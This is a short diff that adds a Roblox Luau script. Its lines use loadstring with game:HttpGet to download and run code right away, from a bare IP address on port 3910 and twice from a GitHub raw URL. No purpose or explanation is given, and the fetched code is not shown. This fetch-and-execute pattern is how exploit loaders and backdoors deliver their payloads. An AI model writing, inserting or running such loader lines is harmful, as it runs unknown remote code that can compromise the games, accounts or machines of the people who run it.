@@ -1,0 +1,5 @@
+ID="5db5cde9-9c29-4d59-8d0f-034c6899eef5";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"))();
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"))()
